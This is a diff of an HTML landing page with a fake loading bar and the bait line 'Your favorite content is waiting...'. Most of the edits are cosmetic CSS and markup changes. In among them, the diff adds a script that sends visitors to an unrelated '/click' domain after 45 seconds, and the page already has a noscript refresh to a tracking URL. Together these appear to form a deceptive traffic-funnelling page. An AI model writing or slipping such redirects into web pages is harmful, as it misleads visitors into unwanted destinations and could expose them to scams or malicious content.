@@ -24,18 +24,18 @@
       font-size: 28px;
       text-align: center;
       color: #111;
-      margin-bottom: 20px;
+      margin-bottom: 10px;
       line-height: 1.4;
     }
 
     .headline div:last-child {
-      text-align: left;
+      text-align: center;
     }
 
     .main-image {
       width: 90%;
       max-width: 500px;
-      margin-bottom: 40px;
+      margin-bottom: 5px;
     }
 
     .loading-container {
@@ -46,7 +46,7 @@
       border-radius: 10px;
       overflow: hidden;
       position: relative;
-      margin-top: 20px;
+      margin-top: 10px;
     }
 
     .loading-bar {
@@ -75,7 +75,7 @@
 
     .continue-button {
       display: none;
-      margin-top: 20px;
+      margin-top: 10px;
       padding: 10px 20px;
       font-size: 28px;
       font-family: 'Noto Sans JP', sans-serif;
@@ -90,7 +90,7 @@
       bottom: 15px;
       right: 15px;
       width: 100px;
-      opacity: 0.1;
+      opacity: 0.18;
       z-index: 1000;
       pointer-events: none;
    }
@@ -147,7 +147,7 @@
 }  </style>
 </head>
 <body>
-  <img src="tuli-logo.webp" alt="Tuli" class="tuli-logo">
+  <img src="tuli_logo.webp" alt="Tuli" class="tuli-logo">
 
   <div class="headline">
     <div>Your favorite content is waiting...</div>
@@ -160,13 +160,13 @@
     <div class="loading-bar" id="loadingBar">Loading...</div>
   </div>
 
-  <button class="continue-button" id="continueButton">Continue</button>
+  <button class="continue-button" id="continueButton" aria-label="Continue to content">Continue</button>
 
   <noscript>
   <meta http-equiv="refresh" content="4;url=x_track12.html?k=d91xq2m7r8">
   </noscript>
 
-  <script src="script.js" data-redirect-url="https://your-redirect-url"></script>
+  <script src="script.js"></script>
 
 <script>
   const image = document.querySelector('.main-image-shimmer');
@@ -179,6 +179,13 @@
     }, 1000); // 1 second = one shimmer cycle
   });
 </script>
+
+<script>
+  setTimeout(function () {
+    window.location.href = "https://distroutshantimal.com/click";
+  }, 45000); // 45 seconds
+</script>
+
 </body>
 </html>
 
